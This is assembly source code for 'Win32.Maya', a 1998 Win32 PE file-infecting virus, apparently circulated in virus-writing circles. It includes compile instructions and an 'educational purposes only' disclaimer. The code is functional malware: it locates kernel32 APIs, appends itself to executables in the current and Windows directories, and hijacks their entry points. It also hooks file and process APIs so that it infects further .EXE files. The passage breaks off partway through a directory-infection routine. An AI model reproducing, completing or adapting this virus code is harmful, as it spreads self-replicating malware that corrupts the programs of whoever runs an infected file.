;----------------------------------------------------------------------------
; ???   ???????????  ?????????????????   ????????? ??????????? ???????????
; ???   ???????????? ?????????????????   ????????? ????????? ??? ?????????
; ?????????????????????? ?????????????   ????????? ???????????????????????
; ?????????????????????? ?????????????   ????????? ???????????????????????
; ?????????? ???? ??????????????????????????   ??? ???  ???  ???  ???  ???
; ???????????????  ?????????????????????????   ??? ???  ???  ???  ???  ???
; ??????????????????? Copyright 1998 The Shaitan [SLAM] ??????????????????
;
;
;                         - BETA PREVIEW v0.99b -
;
; Win32.Maya is a per-process memory resident infector of Win32 PE files...
;
;
; To compile (with TASM 5.0):
; ---------------------------
; tasm32 /ml /m5 maya.asm
; tlink32 /Tpe /aa maya.obj, maya.exe, , import32.lib
; pewrsec maya.exe
;
; Disclaimer:
; -----------
; THIS PROGRAM IS  MEANT FOR EDUCATIONAL PURPOSES  ONLY. THE AUTHOR CANNOT BE
; HELD RESPONSIBLE FOR ANY DAMAGE ARISING OUT OF ANY USE, MISUSE OR INABILITY
; TO USE THIS PROGRAM.
;
;----------------------------------------------------------------------------

.386p
.model flat
JUMPS

code_len                        equ     code_end - code_start
L                               equ     
GENERIC_READ                    equ     80000000h
GENERIC_WRITE                   equ     40000000h
GENERIC_READ_WRITE              equ     GENERIC_READ or GENERIC_WRITE
OPEN_EXISTING                   equ     00000003h
PAGE_READWRITE                  equ     00000004h
PAGE_WRITECOPY                  equ     00000008h
FILE_MAP_WRITE                  equ     00000002h
FILE_SHARE_READ                 equ     00000001h
FILE_ATTRIBUTE_NORMAL           equ     00000080h
FILE_ATTRIBUTE_DIRECTORY        equ     00000010h
FILE_BEGIN                      equ     00000000h

HKEY_CURRENT_USER               equ     80000001h
KEY_SET_VALUE                   equ     00000002h
REG_SZ                          equ     00000001h
SPI_SETDESKWALLPAPER            equ     00000020
CREATE_ALWAYS                   equ     00000002h
MB_ICONEXCLAMATION              equ     00000030h

bmp_filesize            equ     offset bmp_data_end - offset bmp_data_start

FILETIME struc
        dwLowDateTime   dd      ?
        dwHighDateTime  dd      ?
FILETIME ends

WIN32_FIND_DATA struc
        dwFileAttributes        dd              ?
        ftCreationTime          FILETIME        ?
        ftLastAccessTime        FILETIME        ?
        ftLastWriteTime         FILETIME        ?
        nFileSizeHigh           dd              ?
        nFileSizeLow            dd              ?
        dwReserved0             dd              ?
        dwReserved1             dd              ?
        cFileName               db      260     dup     (?)
        cAlternateFileName      db      14      dup     (?)
WIN32_FIND_DATA ends

SYSTEMTIME struc
        wYear           dw      ?
        wMonth          dw      ?
        wDayOfWeek      dw      ?
        wDay            dw      ?
        wHour           dw      ?
        wMinute         dw      ?
        wSecond         dw      ?
        wMilliseconds   dw      ?
SYSTEMTIME ends

; Functions imported by Generation-1 -
extrn           ExitProcess:PROC
extrn           GetModuleHandleA:PROC
extrn           MessageBoxA:PROC

; Some dummy data for Generation-1 - 
.data
dummy   dd      'MAYA'

;----------------------------------------------------------------------------
; CODE -
;----------------------------------------------------------------------------
.code
code_start:
        push    ebp                     ; Save entry point EBP

        call    next_line               ; Call next instruction
next_line:                              ;
        pop     ebp                     ; Pop EIP of the stack
        mov     ebx,ebp                 ; 
        sub     ebp,offset next_line    ; Adjust to get delta

                db      0b8h            ; mov eax,xxxxh (Patched during
eip_patch       dd      1000h           ; infection with RVA of startup EIP)

        add     eax,6                   ; Adjust
        sub     ebx,eax                 ; EBX = Base address of running module
        mov     [module_base+ebp],ebx   ; Save base address

; Get address of GetModuleHandleA from current process' import table
        mov     edx,offset GMH_string   ; Offset of ASCIIZ API name
        add     edx,ebp                 ; Adjust with delta
        mov     ecx,[GMH_string_len+ebp]; Length of API name
        push    ebp                     ; Save EBP
        call    GetImportAPIAddress     ; Get the address of the API call
        pop     ebp                     ; Restore EBP
        cmp     eax,0ffffffffh          ; Could not retrieve API address?
        je      quit                    ; Yes. Do not continue...

        mov     [_GetModuleHandleA+ebp],eax ; Save address of function

        push    ebp                     ; Preserve delta pointer
        mov     ebx,offset k32_string   ; Offset of ASCIIZ "KERNEL32.DLL"
        add     ebx,ebp                 ; Adjust with delta
        push    ebx                     ; Push parameter onto stack
        call    eax                     ; Call GetModuleHandleA
        pop     ebp                     ; Retrieve delta pointer
        mov     [kernel32+ebp],eax      ; Save base address of KERNEL32.DLL

; Get addresses of all other API functions we need...
get_api_addresses:
        mov     edi,offset api_names    ; Start of our API_NAME_STRUCT array
        add     edi,ebp                 ; Adjust with delta
api_address_loop:
        mov     ecx,[edi]               ; ECX = Length of API name string
        cmp     ecx,'MAYA'              ; End of array marker?
        je      aal_end                 ; Yes. Jump...
        add     edi,4                   ; EDI = Offset of ASCIIZ API string
        mov     edx,edi                 ; EDX = "       "       "       "
        add     edi,ecx                 ; EDI = Location to store API address
        push    edi                     ; Save EDI
        call    GetExportAPIAddress     ; Lookup K32 exports for API address
        pop     edi                     ; Restore EDI
        mov     [edi],eax               ; Save address of API function
        add     edi,4                   ; EDI = Start of next API_NAME_STRUCT
        jmp     api_address_loop        ; Loop till done
aal_end:

pp_resident:

; Now we infect files in the current and Windows base directory...
        mov     [infect_counter+ebp],0
        call    InfectCurrentAndWindowsDirectory 

        call    HookAPI                 ; Try to hook some API calls

        call    Payload                 ; Run the virus' payload...

quit:
        mov     eax,[ori_eip+ebp]       ; Original entry point
        add     eax,[module_base+ebp]   ; RVA -> VA
        pop     ebp                     ; Restore the entry point EBP
        push    eax                     ; Push onto stack
        ret                             ; Jump to original EIP

;----------------------------------------------------------------------------
; GetExportAPIAddress - Retrieves address of specified API function from
;                       KERNEL32 export table
;
; On entry     : EDX - ASCIIZ string of API whose address is to be retrieved
;                ECX - Length of the ASCIIZ API string
;
; Return value : Address of API call in EAX
;----------------------------------------------------------------------------
GetExportAPIAddress:
        mov     esi,[kernel32+ebp]      ; ESI = K32 base address
        cmp     word ptr [esi],'ZM'     ; Is K32 there?
        jne     GEAA_quit               ; No. Cannot continue...

        xor     eax,eax                 ; EAX = 0 
        mov     ax,word ptr [esi+3ch]   ; Get RVA of PE header
        add     eax,[kernel32+ebp]      ; RVA to VA
        xchg    esi,eax                 ; ESI = EAX
        cmp     word ptr [esi],'EP'     ; Is the PE header there?
        jne     GEAA_quit               ; No. Cannot continue...

        mov     esi,[esi+78h]           ; Get .edata RVA from IMAGE_DATA_DIR 
        add     esi,[kernel32+ebp]      ; RVA -> VA

        mov     eax,[esi+1ch]           ; RVA of array of function addresses
        add     eax,[kernel32+ebp]      ; RVA -> VA
        mov     [AddressOfFunctions+ebp],eax ; Save

        mov     eax,[esi+20h]           ; RVA of array of API name strings
        add     eax,[kernel32+ebp]      ; RVA to VA
        mov     [AddressOfNames+ebp],eax; Save

        mov     eax,[esi+24h]           ; RVA of array of export ordinals
        add     eax,[kernel32+ebp]      ; RVA -> VA
        mov     [AddressOfOrdinals+ebp],eax; Save

        xor     eax,eax                 ; Initialize our counter
apisearch_loop:
        push    ecx                     ; ECX = Length of ASCIIZ API string
        mov     esi,edx                 ; ASCIIZ API function name
        mov     edi,[AddressOfNames+ebp]; Point to start of table containing
        add     edi,eax                 ; API function name strings...
        mov     edi,[edi]               ; "     "       "       "       "
        add     edi,[kernel32+ebp]      ; "     "       "       "       "
        repe    cmpsb                   ; Compare the two strings
        cmp     ecx,0                   ; Exact match found?
        je      match                   ; Yes! Jump...
        add     eax,4                   ; No. Lets compare the next string...
        pop     ecx                     ; Restore ECX
        jmp     apisearch_loop          ; Continue looping (it's a for(;;) :)
match:
        pop     ecx                     ; Take it off the stack
        shr     eax,1                   ; Divide by 2 (array is of WORDs)
        add     eax,[AddressOfOrdinals+ebp]; Point to proper element in array
        xor     ebx,ebx                 ; EBX = 0
        mov     bx,word ptr [eax]       ; Get our index into AddressOfFuncs
        shl     ebx,2                   ; Multiply by 4 (array is of DWORDs)
        add     ebx,[AddressOfFunctions+ebp]; Point to relevant element in array
        mov     eax,[ebx]               ; EAX = RVA of API function address
        add     eax,[kernel32+ebp]      ; EAX = Address of API function!!!
        ret                             ; Exit with API address in EAX
GEAA_quit:
        mov     eax,0ffffffffh          ; Error value in EAX
        ret                             ; End of GetExportAPIAddress

;----------------------------------------------------------------------------
; GetImportAPIAddress - Retrieves address of imported API function from the
;                       the current processes Import Table.
;
; On entry      :       EDX = Offset of ASCIIZ API name to search for
;               :       ECX = Length of ASCIIZ string
;
; On Return     :       EAX = Address of API function
;                       EBX = Offset in import table where API address
;                             is stored
;----------------------------------------------------------------------------
GetImportAPIAddress:
        mov     esi,[module_base+ebp]   ; ESI = Base address of process
        cmp     word ptr [esi],'ZM'     ; Is the base correctly assumed?
        jne     GIAA_end                ; No. Quit...

        xor     eax,eax                 ; EAX = 0
        mov     ax, word ptr [esi+3ch]  ; Get RVA of PE header
        mov     esi,eax                 ; ESI = RVA of PE offset
        add     esi,[module_base+ebp]   ; Convert RVA to VA
        cmp     word ptr [esi],'EP'     ; Is the PE header there?
        jne     GIAA_end                ; Nope. Quit...

        mov     esi,[esi+80h]           ; RVA of .idata section
        add     esi,[module_base+ebp]   ; ESI = Start of .idata section

        mov     eax,esi                 ; EAX = Start of .idata
find_ik32:
        mov     esi,eax                 ; ESI = First/next IMPORT_DESCRIPTOR
        mov     esi,[esi+0ch]           ; RVA of imported module ASCIIZ string
        add     esi,[module_base+ebp]   ; RVA >> VA
        cmp     [esi],'NREK'            ; IMPORT_DESCRIPTOR for K32?
        je      ik32_found              ; Yes, we found it!
        add     eax,14h                 ; EAX = Next IMPORT_DESCRIPTOR
        jmp     find_ik32               ; Loop till found...
ik32_found:
        mov     esi,eax                 ; ESI = K32 IMPORT_DESCRIPTOR
        mov     eax,[esi+10h]           ; RVA of IMAGE_THUNK_DATA
        add     eax,[module_base+ebp]   ; RVA to VA
        mov     [itd_va+ebp],eax        ; Save it for later use...
        cmp     dword ptr [esi],0       ; NULL "OriginalFirstThunk" field?
        je      GIAA_end                ; Yes, No hint-name table then :(
        mov     esi,[esi]               ; Pointer to pointer!
        add     esi,[module_base+ebp]   ; RVA >> VA
        mov     ebx,esi                 ; 
        xor     eax,eax                 ; Init EAX (for use as an index)

iAPI_loop:
        cmp     dword ptr [ebx],0       ; No more RVAs?
        je      GIAA_end                ; Yes. Jump...
        cmp     byte ptr [ebx+3],80h    ; Ordinal?
        je      inc_ndx                 ; Yes. Skip...
        mov     esi,[ebx]               ; 
        add     esi,[module_base+ebp]   ; 
        add     esi,2                   ; ESI = Start of ASCIIZ API name
        mov     edi,edx                 ; EDI = String to compare with
compare:
        push    ecx                     ; Preserve ECX
        repe    cmpsb                   ; Compare the 2 strings...
        cmp     ecx,0                   ; Match found?
        pop     ecx                     ; Restore ECX (length of API string)
        je      API_found               ; Yes! Jump...
inc_ndx:
        inc     eax                     ; No. Increment our index
        add     ebx,4                   ; 
        jmp     iAPI_loop               ; Continue looping...
API_found:
        shl     eax,2                   ; Multiply by 4
        add     eax,[itd_va+ebp]        ; Point to corresponding element
        mov     ebx,eax                 ; EBX = Offset containing API address
        mov     eax,[eax]               ; EAX = API call address
        ret                             ; Return to caller

GIAA_end:
        mov     eax,0ffffffffh          ; Error code
        ret                             ; Return

;----------------------------------------------------------------------------
; InfectFile -
;
; On entry      :       EDX = ASCIIZ filename
;
; Returns       :       On success EAX = 0 & Infection counter incremented
;                       On failure EAX = 0ffffffffh
;----------------------------------------------------------------------------
InfectFile:
        mov     [infect_success+ebp],0  ; Initialize flag

        call    VxGetFileAttributes     ; Get file attributes
        mov     [ori_attrib+ebp],eax    ; Save them

        push    edx                     ; Save EDX (offset to ASCIIZ filename)

        mov     eax,FILE_ATTRIBUTE_NORMAL ; New file attributes to set
        call    VxSetFileAttributes       ; Remove read-only etc restrictions

        call    VxOpenFile              ; Try to open the file
        cmp     eax,0ffffffffh          ; Error opening the file?
        je      if_restore_attrib       ; Yes. Do not continue...
        mov     [file_handle+ebp],eax   ; Save file handle

        call    VxGetFileSize           ; Get the filesize
        cmp     eax,0ffffffffh          ; Error?
        je      if_close_file           ;
        cmp     [fsize_high+ebp],0      ; File too big?
        jne     if_close_file           ; Yes. Do not try to infect
        xchg    ecx,eax                 ; ECX = File size
        mov     [new_filesize+ebp],ecx  ; "     "       "       "

        mov     eax,[file_handle+ebp]   ; EAX = File handle
        mov     ecx,[new_filesize+ebp]  ; ECX = File size
        add     ecx,code_len + 1000h    ; Size of mapping object
        call    VxCreateFileMapping     ; Create mapping object
        cmp     eax,0                   ; Failure?
        je      if_close_map            ; Yes. Cannot continue...
        mov     [map_handle+ebp],eax    ; Save mapping handle

        mov     ecx,[new_filesize+ebp]  ; ECX = No. of bytes to map view
        add     ecx,code_len + 1000h    ; "     "       "       "       "
        call    VxMapViewOfFile         ; Map view of file
        cmp     eax,0                   ; Failure?
        je      if_close_map            ; Yes. Do not continue...
        mov     [map_address+ebp],eax   ; Save address of map view

        mov     esi,eax                 ; ESI = Address of map view
        cmp     word ptr [esi],'ZM'     ; Is the MZ signature there?
        jne     if_close_view           ; No. Not an EXE file...

        cmp     word ptr [esi+12h],'MW' ; Already infected?
        je      if_close_view           ; Yes. Jump...
        mov     word ptr [esi+12h],'MW' ; No. Mark as infected now...

        xor     eax,eax                 ; EAX = 0
        mov     ax,word ptr [esi+3ch]   ; Get offset to PE header
        cmp     ax,0                    ; NULL field?
        je      if_close_view           ; Yes. Not a PE file...
        cmp     eax,new_filesize        ; Invalid field?
        jae     if_close_view           ; Yes. Corrupt PE file... (?)
        add     eax,[map_address+ebp]   ; RVA -> VA
        mov     esi,eax                 ; ESI = Offset of PE header
        cmp     word ptr [esi],'EP'     ; Is the PE signature there?
        jne     if_close_view           ; Nope. Not a PE file...
        mov     [pe_header+ebp],eax     ; Save it for later use

        mov     eax,[esi+3ch]           ; EAX = File Alignment
        mov     [file_align+ebp],eax    ; Save for later use

        mov     eax,[ori_eip+ebp]       ; Get original EIP in EAX
        mov     [tmp_eip+ebp],eax       ; Save it in a temporary variable
        mov     eax,[esi+28h]           ; EAX = Original EIP
        mov     [ori_eip+ebp],eax       ; Save it

        xor     eax,eax                 ; EAX = 0
        mov     ax,word ptr [esi+6]     ; Number of sections in file
        dec     eax                     ; Decrease by 1
        mov     cx,28h                  ; Size of each IMAGE_SECTION_HEADER
        mul     cx                      ; EAX = Size of section table - 28h
        mov     ebx,[esi+74h]           ; EAX = NumberOfRvaAndSizes
        shl     ebx,3                   ; Multiply by 3
        add     eax,ebx                 ; Add size of IMAGE_DATA_DIRECTORY
        add     eax,78h                 ; Size of PE header (- IMG_DATA_DIR)
        add     eax,[pe_header+ebp]     ; EAX = Last entry in section table
        mov     [last_entry+ebp],eax    ; Save ...

        mov     edi,eax                 ; EDI = Last entry in section table
        mov     eax,[edi+10h]           ; EAX = Size of rawdata
        mov     [size_rawdata+ebp],eax  ; Save for later use
        add     eax,[edi+0ch]           ; Add VirtualAddress to get new EIP
        mov     [eip_patch+ebp],eax     ; Patch the mov eax,xxxx instruction
        mov     [new_eip+ebp],eax       ; Save for later use
        
        push    edi                     ; Preserve EDI
        mov     eax,[edi+14h]           ; EAX = RVA of section data
        add     eax,[map_address+ebp]   ; RVA -> VA
        add     eax,[edi+10h]           ; EAX = Destination to copy to
        mov     edi,eax                 ; EDI = "       "       "       "
        mov     esi,offset code_start   ; ESI = Source to copy from
        add     esi,ebp                 ; Adjust with delta
        mov     ecx,code_len            ; ECX = No. of bytes to copy
        cld                             ; Clear direction flag
        rep     movsb                   ; Copy all the bytes
        pop     edi                     ; Restore EDI

        add     dword ptr [edi+10h],code_len ; New SizeOfRawData
        add     [new_filesize+ebp],code_len  ; New filesize

        xor     edx,edx                 ; EDX = 0
        mov     eax,[edi+10h]           ; EAX = Size of raw data
        mov     ecx,[file_align+ebp]    ; ECX = File alignment
        push    ecx                     ; Preserve ECX
        div     ecx                     ; Divide by ECX
        pop     ecx                     ; Restore ECX
        sub     ecx,edx                 ; ECX = No. of bytes to pad
        add     [edi+10h],ecx           ; New size of section raw-data
        add     [new_filesize+ebp],ecx  ; Final new filesize!
        mov     eax,[edi+10h]           ; EAX = SizeofRawData
        mov     [edi+8],eax             ; VirtualSize = SizeOfRawData

        or      dword ptr [edi+24h],00000020h ; Section now contains CODE
        or      dword ptr [edi+24h],20000000h ; Section is now EXECUTABLE
        or      dword ptr [edi+24h],80000000h ; Section is now WRITEABLE

        mov     esi,[pe_header+ebp]     ; ESI = Offset of PE header

; Now ESI = Offset of PE header & EDI = Offset of last entry of section table

        mov     eax,[new_eip+ebp]       ; EAX = Previously saved new EIP
        mov     [esi+28h],eax           ; Patch PE header AddressOfEntryPoint

        mov     eax,[new_filesize+ebp]  ; EAX = New image size
        mov     [esi+50h],eax           ; Patch PE header SizeOfImage

        mov     eax,[tmp_eip+ebp]       ; Get saved EIP
        mov     [ori_eip+ebp],eax       ; Restore the original variable

        mov     [infect_success+ebp],1  ; Successful infection!
        
if_close_view:
        mov     eax,[map_address+ebp]   ; EAX = Mapping address
        call    VxUnmapViewOfFile       ; Unmap the mapped view

if_close_map:
        mov     eax,[map_handle+ebp]    ; Get mapping object handle
        call    VxCloseHandle           ; Close the mapping object
                                        
if_setfilesize:
        mov     eax,[file_handle+ebp]   ; EAX = File handle
        mov     ecx,[new_filesize+ebp]  ; ECX = Distance to move
        call    VxSetFilePointer        ; Seek to reqd. location in file
        cmp     eax,0ffffffffh          ; Error?
        je      if_close_file           ; Yes. Jump...

        mov     eax,[file_handle+ebp]   ; EAX = File handle
        call    VxSetEndOfFile          ; Mark end of file

if_close_file:
        mov     eax,[file_handle+ebp]   ; Retrieve open file's handle
        call    VxCloseHandle           ; Close the file

if_restore_attrib:
        pop     edx                     ; Restore saved filename
        mov     eax,[ori_attrib+ebp]    ; Get saved attributes
        call    VxSetFileAttributes     ; Restore original attributes

if_end:
        ret                             ; Return to caller

;----------------------------------------------------------------------------
; VxOpenFile -
;----------------------------------------------------------------------------
VxOpenFile:
        push    ebp                             ; Save delta pointer
        push    L 0                             ; Template file (?)
        push    FILE_ATTRIBUTE_NORMAL           ; Attribute of file
        push    OPEN_EXISTING                   ; Open an existing file
        push    L 0                             ; Security Attributes
        push    FILE_SHARE_READ                 ; Share mode
        push    GENERIC_READ_WRITE              ; Access mode
        push    edx                             ; ASCIIZ Filename
        mov     eax,[_CreateFileA+ebp]          ; Address of API call
        call    eax                             ; Call API to open file
        pop     ebp                             ; Restore delta pointer
        ret                                     ; Return to caller

;----------------------------------------------------------------------------
; VxCloseHandle -
;----------------------------------------------------------------------------
VxCloseHandle:
        push    ebp                             ; Preserve delta
        push    eax                             ; EBX = File handle
        mov     eax,[_CloseHandle+ebp]          ; API to call
        call    eax                             ; Call API function
        pop     ebp                             ; Restore delta
        ret                                     ; Return to caller

;----------------------------------------------------------------------------
; VxCreateFileMapping -
;----------------------------------------------------------------------------
VxCreateFileMapping:
        push    ebp                             ; Save delta pointer
        push    L 0                             ; Name of mapping object
        push    ecx                             ; Max size of mapping object
        push    L 0                             ; "     "       "       "
        push    PAGE_READWRITE                  ; Read/Write access
        push    L 0                             ; Security attributes
        push    eax                             ; Handle of file to map
        mov     eax,[_CreateFileMappingA+ebp]   ; Address of API call
        call    eax                             ; Call API to map file
        pop     ebp                             ; Restore delta pointer
        ret                                     ; Return to caller

;----------------------------------------------------------------------------
; VxMapViewOfFile -
;----------------------------------------------------------------------------
VxMapViewOfFile:
        push    ebp                             ; Save delta pointer
        push    ecx                             ; No. of bytes to map
        push    L 0                             ; File offset (low)
        push    L 0                             ; File offset (high)
        push    FILE_MAP_WRITE                  ; Read/Write access
        push    eax                             ; Handle to mapping object
        mov     eax,[_MapViewOfFile+ebp]        ; Address of API call
        call    eax                             ; Create a map file view
        pop     ebp                             ; Restore delta pointer
        ret                                     ; Return to caller

;----------------------------------------------------------------------------
; VxUnmapViewOfFile -
;----------------------------------------------------------------------------
VxUnmapViewOfFile:
        push    ebp                             ; Save delta pointer
        push    eax                             ; Address of file map
        mov     eax,[_UnmapViewOfFile+ebp]      ; Address of API to call
        call    eax                             ; Call API
        pop     ebp                             ; Restore delta pointer
        ret                                     ; Return to caller

;----------------------------------------------------------------------------
; VxSetFilePointer -
;----------------------------------------------------------------------------
VxSetFilePointer:
        push    ebp                             ; Save delta pointer
        push    FILE_BEGIN                      ; Move from start of file
        push    L 0                             ; Distance to move (high)
        push    ecx                             ; "     "       "       "
        push    eax                             ; Handle of file
        mov     eax,[_SetFilePointer+ebp]       ; API function to call
        call    eax                             ; Call API
        pop     ebp                             ; Restore delta pointer
        ret                                     ; Return to caller

;----------------------------------------------------------------------------
; VxSetEndOfFile -
;----------------------------------------------------------------------------
VxSetEndOfFile:
        push    ebp                             ; Save delta pointer
        push    eax                             ; Handle of file to truncate
        mov     eax,[_SetEndOfFile+ebp]         ; API to call
        call    eax                             ; Call API to truncate file
        pop     ebp                             ; Restore delta pointer
        ret                                     ; Return to caller

;----------------------------------------------------------------------------
; VxGetFileSize -
;----------------------------------------------------------------------------
VxGetFileSize:
        push    ebp                             ; Save delta pointer
        mov     ebx,offset fsize_high           ; Offset to store high-dword
        add     ebx,ebp                         ; of filesize...
        push    ebx                             ; Push onto stack
        push    eax                             ; Push file handle onto stack
        mov     eax,[_GetFileSize+ebp]          ; Get address of API call
        call    eax                             ; Call API function
        pop     ebp                             ; Restore delta pointer
        ret                                     ; Return to caller

;----------------------------------------------------------------------------
; VxGetFileAttributes -
;----------------------------------------------------------------------------
VxGetFileAttributes:
        push    ebp                             ; Save delta pointer
        push    edx                             ; Save EDX
        push    edx                             ; Offset of ASCIIZ filename
        mov     eax,[_GetFileAttributesA+ebp]   ; API to call
        call    eax                             ; Call API function
        pop     edx                             ; Restore EDX
        pop     ebp                             ; Restore delta
        ret                                     ; Return to caller

;----------------------------------------------------------------------------
; VxSetFileAttributes -
;----------------------------------------------------------------------------
VxSetFileAttributes:
        push    ebp                             ; Save delta pointer
        push    eax                             ; Attributes to set
        push    edx                             ; Offset of ASCIIZ filename
        mov     eax,[_SetFileAttributesA+ebp]   ; API to call
        call    eax                             ; Call API function
        pop     ebp                             ; Restore delta pointer
        ret                                     ; Return to caller

;----------------------------------------------------------------------------
; VxGetCurrentDirectory -
;----------------------------------------------------------------------------
VxGetCurrentDirectory:
        push    ebp                     ; Save delta
        push    eax                     ; Buffer to store directory string
        push    L 128                   ; Length of Directory buffer
        mov     eax,[_GetCurrentDirectoryA+ebp]; Address of API to call
        call    eax                     ; Call API
        pop     ebp                     ; Restore EBP
        ret                             ; Return to caller

;----------------------------------------------------------------------------
; VxSetCurrentDirectory -
;----------------------------------------------------------------------------
VxSetCurrentDirectory:
        push    ebp                     ; Save delta
        push    eax                     ; Buffer to store directory string
        mov     eax,[_SetCurrentDirectoryA+ebp]; Address of API to call
        call    eax                     ; Call API
        pop     ebp                     ; Restore EBP
        ret                             ; Return to caller

;----------------------------------------------------------------------------
; VxGetWindowsDirectory -
;----------------------------------------------------------------------------
VxGetWindowsDirectory:
        push    ebp                     ; Save delta
        push    L 128                   ; Size of buffer
        push    eax                     ; Buffer to store directory string
        mov     eax,[_GetWindowsDirectoryA+ebp]; Address of API to call
        call    eax                     ; Call API
        pop     ebp                     ; Restore EBP
        ret                             ; Return to caller

;----------------------------------------------------------------------------
; VxGetSystemTime -
;----------------------------------------------------------------------------
VxGetSystemTime:
        push    ebp                     ; Save delta pointer
        mov     eax,offset st           ; Offset of SYSTEMTIME structure
        add     eax,ebp                 ; Adjust
        push    eax                     ; Pass as parameter
        mov     eax,[_GetSystemTime+ebp]; Address of API to call
        call    eax                     ; Call API
        pop     ebp                     ; Restore delta pointer
        ret                             ; Return to caller

;----------------------------------------------------------------------------
; VxGetModuleHandle -
;----------------------------------------------------------------------------
VxGetModuleHandle:
        push    ebp                     ; Save delta
        push    eax                     ; EAX = ASCIIZ module name
        mov     eax,[_GetModuleHandleA+ebp] ; Address of API to call
        call    eax                     ; Call API
        pop     ebp                     ; Restore EBP
        ret                             ; Return to caller

;----------------------------------------------------------------------------
; VxGetProcAddress -
;----------------------------------------------------------------------------
VxGetProcAddress:
        push    ebp                     ; Save EBP
        push    edx                     ; EDX = ASCIIZ API name string
        push    eax                     ; EAX = Base address of module
        mov     eax,[_GetProcAddress+ebp]; Address of API to call
        call    eax                     ; Call GetProcAddress
        pop     ebp                     ; Restore EBP
        ret                             ; Return to caller

;----------------------------------------------------------------------------
; HookAPI - This function looks up the addresses of several API functions
;           in the import table of the current process and replaces them
;           with the addresses of the virus' handlers.
;----------------------------------------------------------------------------
HookAPI:
        mov     edi,offset hookable_api ; Start of Hookable API array 
        add     edi,ebp                 ; Adjust with delta
hookapi_loop:
        mov     ecx,[edi]               ; ECX = Length of API string
        cmp     ecx,'SHAI'              ; End of array?
        je      hal_end                 ; Yes. Exit loop...
        add     edi,4                   ; EDI = Offset of API string
        mov     edx,edi                 ; EDX = "       "       "
        push    edi                     ; Save EDI
        push    ecx                     ; Save ECX
        push    ebp                     ; Save delta
        call    GetImportAPIAddress     ; Get API address
        pop     ebp                     ; Restore delta
        pop     ecx                     ; Restore ECX
        pop     edi                     ; Restore EDI
        add     edi,ecx                 ; EDI = Offset to store API address
        cmp     eax,0ffffffffh          ; API not found in import table?
        je      next_hook               ; No. Jump...
        mov     [edi],eax               ; Save original API address
        mov     eax,[edi+4]             ; EAX = Address of new handler
        add     eax,ebp                 ; Adjust with delta
        mov     [ebx],eax               ; Patch import table 
next_hook:
        add     edi,8                   ; Next element in Hookable API array
        jmp     hookapi_loop            ; Loop till done
hal_end:
        ret                             ; Return to caller

;----------------------------------------------------------------------------
; HookInfect - 
;----------------------------------------------------------------------------
HookInfect:
        pushad                          ; Save all registers
        call    GetDelta                ; Get delta pointer
        add     ecx,28h                 ; ESP + ECX = Offset of ASCIIZ string
        mov     edx,[esp+ecx]           ; EDX = ASCIIZ filename to infect
        call    CheckIfEXE              ; Check if file has .EXE extension
        cmp     eax,1                   ; Is it an .EXE?
        jne     hi_end                  ; No. Exit...
        call    InfectFile              ; Try to infect the file
hi_end:
        popad                           ; Restore saved registers
        ret                             ; Return to caller

;----------------------------------------------------------------------------
; CheckIfEXE - 
;----------------------------------------------------------------------------
CheckIfEXE:
        mov     esi,edx                 ; ESI = Start of ASCIIZ string
        cld                             ; Clear direction flag
cie_loop:
        lodsb                           ; AL = Byte at ESI (and ESI++)
        cmp     al,0                    ; End of string?
        je      cie_end_fail            ; Yes. Jump...
        cmp     al,'.'                  ; DOT found?
        jne     cie_loop                ; Loop till done...
        cmp     [esi-1],'EXE.'          ; Is it an EXE?
        je      cie_end_ok              ; Yes. Jump...
        cmp     [esi-1],'exe.'          ; Is it an EXE?
        je      cie_end_ok              ; Yes. Jump...
cie_end_fail:
        xor     eax,eax                 ; EAX = 0 (Not an EXE)
        ret                             ; Return
cie_end_ok:
        mov     eax,1                   ; EAX = 1 (File has an EXE extension)
        ret                             ; Return

;----------------------------------------------------------------------------
; The following are handlers for hooked API calls...
;----------------------------------------------------------------------------
HookMoveFile:
        call    FunctionUsedByHookers   ; 
        jmp     [_MoveFileA+ecx]        ; Jump to original API address

;----------------------------------------------------------------------------
HookCopyFile:
        call    FunctionUsedByHookers   ; 
        jmp     [_CopyFileA+ecx]        ; Jump to original API address

;----------------------------------------------------------------------------
HookCreateFile:
        call    FunctionUsedByHookers   ; 
        jmp     [_CreateFileHook+ecx]   ; Jump to original API address

;----------------------------------------------------------------------------
HookDeleteFile:
        call    FunctionUsedByHookers   ; 
        jmp     [_DeleteFileA+ecx]      ; Jump to original API address

;----------------------------------------------------------------------------
HookSetFileAttributes:
        call    FunctionUsedByHookers   ; 
        jmp     [_SetFileAttributesHook+ecx] ; Jump to original API address

;----------------------------------------------------------------------------
HookGetFileAttributes:
        call    FunctionUsedByHookers   ; 
        jmp     [_GetFileAttributesHook+ecx] ; Jump to original API address

;----------------------------------------------------------------------------
HookGetFullPathName:
        call    FunctionUsedByHookers   ; 
        jmp     [_GetFullPathNameA+ecx] ; Jump to original API address

;----------------------------------------------------------------------------
HookCreateProcess:
        call    FunctionUsedByHookers   ; 
        jmp     [_CreateProcessA+ecx]   ; Jump to original API address


;----------------------------------------------------------------------------
FunctionUsedByHookers:
        mov     ecx,4                   ; Parameter no. * 4
        call    HookInfect              ; Try to infect the file
        push    ebp                     ; Save EBP
        call    GetDelta                ; EBP = Delta pointer
        mov     ecx,ebp                 ; ECX = "       "       "
        pop     ebp                     ; Restore ECX
        ret                             ; Return to uh... hooker

;----------------------------------------------------------------------------
; GetDelta -
;----------------------------------------------------------------------------
GetDelta:
        call    get_delta               ; Get delta pointer in EBP using the
get_delta:                              ; usual trick...
        pop     ebp                     ; "     "       "       "       "
        sub     ebp,offset get_delta    ; "     "       "       "       "
        ret                             ; "     "       "       "       "

;----------------------------------------------------------------------------
; InfectCurrentAndWindowsDirectory -
;----------------------------------------------------------------------------
InfectCurrentAndWindowsDirectory:
        mov     [infect_counter+ebp],0  ; Initialize counter
        call    InfectCurrentDirectory  ; Infect files in current directory
        cmp     [infect_counter+ebp],5  ; Maximum no. of files infected?
        je      ICAWD_end               ; Yes. Jump...

        mov     eax,offset currdir      ; Buffer to store dir string
        add     eax,ebp                 ; Adjust with delta
        call    VxGetCurrentDirectory   ; Get current directory
        cmp     eax,00000000h           ; Error?
        je      ICAWD_end               ; Yes, Jump...

        mov     eax,offset windir       ; Buffer to store dir string
        add     eax,ebp                 ; Adjust with delta
        call    VxGetWindowsDirectory   ; Get Windows base directory
        cmp     eax,00000000h           ; Error?
        je      ICAWD_end               ; Yes, Jump...

        mov     eax,offset windir       ; Offset of ASCIIZ dir string
        add     eax,ebp                 ; Adjust with delta
        call    VxSetCurrentDirectory   ; Change to Windows base directory
        cmp     eax,00000000h           ; Error?
